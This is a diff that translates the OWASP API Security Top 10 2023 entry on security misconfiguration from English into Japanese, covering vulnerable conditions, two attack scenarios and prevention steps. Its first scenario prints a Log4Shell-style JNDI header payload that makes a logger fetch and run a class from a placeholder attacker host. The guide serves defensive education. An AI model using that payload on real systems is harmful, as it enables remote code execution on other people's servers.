@@ -4,34 +4,34 @@ API7:2023 セキュリティの設定ミス (Security Misconfiguration)
 | 脅威エージェント/攻撃手法 | セキュリティ上の弱点 | 影響 |
 | - | - | - |
 | API 依存 : 悪用難易度 **3** | 普及度 **3** : 検出難易度 **3** | 技術的影響 **2** : ビジネス依存 |
-| Attackers will often attempt to find unpatched flaws, common endpoints, or unprotected files and directories to gain unauthorized access or knowledge of the system. | Security misconfiguration can happen at any level of the API stack, from the network level to the application level. Automated tools are available to detect and exploit misconfigurations such as unnecessary services or legacy options. | Security misconfigurations can not only expose sensitive user data, but also system details that can lead to full server compromise. |
+| 多くの場合、攻撃者はパッチを適用していない欠陥、共通のエンドポイント、保護されていないファイルやディレクトリを見つけて、不認可のアクセスやシステムの知識を得ようとします。 | セキュリティの設定ミスはネットワークレベルからアプリケーションレベルまで API スタックのどのレベルでも起こりえます。不要なサービスやレガシーオプションなどの設定ミスを検出して悪用する自動ツールを利用できます。 | セキュリティの設定ミスは機密性の高いユーザーデータだけではなく、サーバー全体の侵害につながるシステムの詳細も流出する可能性があります。 |
 
 ## その API は脆弱か？
 
-The API might be vulnerable if:
+API は以下のような場合に脆弱となる可能性があります。
 
-* Appropriate security hardening is missing across any part of the API stack,  or if there are improperly configured permissions on cloud services
+* API スタックのいずれかの部分で適切なセキュリティ堅牢化が行われていない場合や、クラウドサービスで不適切に設定された権限がある場合
 
-* The latest security patches are missing, or the systems are out of date
-* Unnecessary features are enabled (e.g. HTTP verbs, logging features)
-* There are discrepancies in the way incoming requests are processed by servers  in the HTTP server chain
+* 最新のセキュリティパッチが適用されていない場合や、システムが古い場合
+* 不要な機能が有効である場合 (HTTP verb、ログ機能など)
+* HTTP サーバーチェーン内のサーバーが受信したリクエストを処理する方法に齟齬がある場合
 
-* Transport Layer Security (TLS) is missing
-* Security or cache control directives are not sent to clients
-* A Cross-Origin Resource Sharing (CORS) policy is missing or improperly set
-* Error messages include stack traces, or expose other sensitive information
+* Transport Layer Security (TLS) がない場合
+* セキュリティディレクティブやキャッシュコントロールディレクティブがクライアントに送信されない場合
+* Cross-Origin Resource Sharing (CORS) ポリシーがない場合や適切に設定されていない場合
+* エラーメッセージにスタックトレースが含まれている場合や、他の機密情報を公開している場合
 
 ## 攻撃シナリオの例
 
 ### シナリオ #1
 
-An API back-end server maintains an access log written by a popular third-party open-source logging utility with support for placeholder expansion and JNDI (Java Naming and Directory Interface) lookups, both enabled by default. 
-For each request, a new entry is written to the log file with the following pattern: `<method> <api_version>/<path> - <status_code>`.
+ある API バックエンドサーバーは一般的なサードパーティのオープンソースログ記録ユーティリティによって書き込まれたアクセスログを維持します。これはプレースフォルダ拡張と JNDI (Java Naming and Directory Interface) ルックアップをサポートしており、デフォルトで有効になっています。
+各リクエストに対して、新しいエントリが次のパターン `<method> <api_version>/<path> - <status_code>` でログファイルに書き込まれます。
 
 
 
 
-A bad actor issues the following API request, which gets written to the access log file:
+悪意のあるアクターが以下の API リクエストを発行し、それがアクセスログファイルに書き込まれます。
 
 
 ```
@@ -39,7 +39,7 @@ GET /health
 X-Api-Version: ${jndi:ldap://attacker.com/Malicious.class}
 ```
 
-Due to the insecure default configuration of the logging utility and a permissive network outbound policy, in order to write the corresponding entry to the access log, while expanding the value in the `X-Api-Version` request header, the logging utility will pull and execute the `Malicious.class` object from the attacker's remote controlled server.
+ログ記録ユーティリティの安全でないデフォルト設定と寛容なネットワークアウトバウンドポリシーにより、アクセスログに当該エントリを書き込むために、`X-Api-Version` リクエストヘッダの値を展開して、このログ記録ユーティリティは攻撃者のリモートコントロールサーバーから `Malicious.class` を取得して実行するでしょう。
 
 
 
@@ -47,8 +47,8 @@ Due to the insecure default configuration of the logging utility and a permissiv
 
 ### シナリオ #2
 
-A social network website offers a "Direct Message" feature that allows users to keep private conversations. 
-To retrieve new messages for a specific conversation, the website issues the following API request (user interaction is not required):
+あるソーシャルネットワークウェブサイトではユーザーがプライベートな会話を続けることができる「ダイレクトメッセージ」機能を提供しています。
+特定の会話の新しいメッセージを取得するために、ウェブサイトは以下の API リクエストを発行します (ユーザーによる操作は必要ありません) 。
 
 
 
@@ -56,36 +56,36 @@ To retrieve new messages for a specific conversation, the website issues the fol
 GET /dm/user_updates.json?conversation_id=1234567&cursor=GRlFp7LCUAAAA
 ```
 
-Because the API response does not include the Cache-Control HTTP response header, private conversations end-up cached by the web browser, allowing malicious actors to retrieve them from the browser cache files in the filesystem.
+この API レスポンスには Cache-Control HTTP レスポンスヘッダが含まれていないため、プライベートな会話は最終的にウェブブラウザにキャッシュされ、悪意のあるアクターはファイルシステム内のブラウザキャッシュファイルからその会話を取得できます。
 
 
 
 
 ## 防止方法
 
-The API life cycle should include
+API ライフサイクルには以下を含めます。
 
-* A repeatable hardening process leading to fast and easy deployment of a  properly locked down environment
+* 適切にロックダウンした環境を迅速かつ容易なデプロイメントにつながる反復可能な堅牢化プロセス
 
-* A task to review and update configurations across the entire API stack. The  review should include: orchestration files, API components, and cloud  services (e.g. S3 bucket permissions)
-
-
-* An automated process to continuously assess the effectiveness of the  configuration and settings in all environments
+* API スタック全体の設定をレビューして更新するタスク。レビューにはオーケストレーションファイル、API コンポーネント、クラウドサービス (S3 バケットのパーミッションなど) を含めます。
 
 
-Furthermore:
-
-* Ensure that all API communications from the client to the API server and any  downstream/upstream components happen over an encrypted communication channel  (TLS), regardless of whether it is an internal or public-facing API.
+* すべての環境における構成と設定の有効性を継続的に評価する自動化されたプロセス
 
 
-* Be specific about which HTTP verbs each API can be accessed by: all other  HTTP verbs should be disabled (e.g. HEAD).
+さらに
 
-* Implement a proper Cross-Origin Resource Sharing (CORS) policy on APIs  expected to be accessed from browser-based clients (e.g. web app front-ends).
-
-* Ensure all servers in the HTTP server chain (e.g. load balancers, reverse  and forward proxies, and back-end servers) process incoming requests in a  uniform manner to avoid desync issues.
+* クライアントから API サーバーおよびあらゆるダウンストリームコンポーネントおよびアップストリームコンポーネントへのすべての API 通信は、内部 API であるか外部公開 API であるかに関わらず、暗号化された通信チャネル (TLS) で行うようにします。
 
 
-* Where applicable, define and enforce all API response payload schemas,  including error responses, to prevent exception traces and other valuable  information from being sent back to attackers.
+* 各 API にアクセスできる HTTP verb を特定します。それ以外の HTTP verb (HEAD など) はすべて無効にします。
+
+* ブラウザベースのクライアント (ウェブアプリのフロントエンドなど) からアクセスされることが予想される API には、適切な Cross-Origin Resource Sharing (CORS) ポリシーを実装します。
+
+* HTTP サーバーチェーンのすべてのサーバー (ロードバランサ、リバースプロキシ、フォワードプロキシ、バックエンドサーバなど) が受信リクエストを均一な方法で処理して、非同期問題を回避するようにします。
+
+
+* 適用可能であれば、エラーレスポンスを含むすべての API レスポンスペイロードスキーマを定義して適用し、例外トレースやその他の価値ある情報が攻撃者に送り返されることを防ぎます。
 
 
 
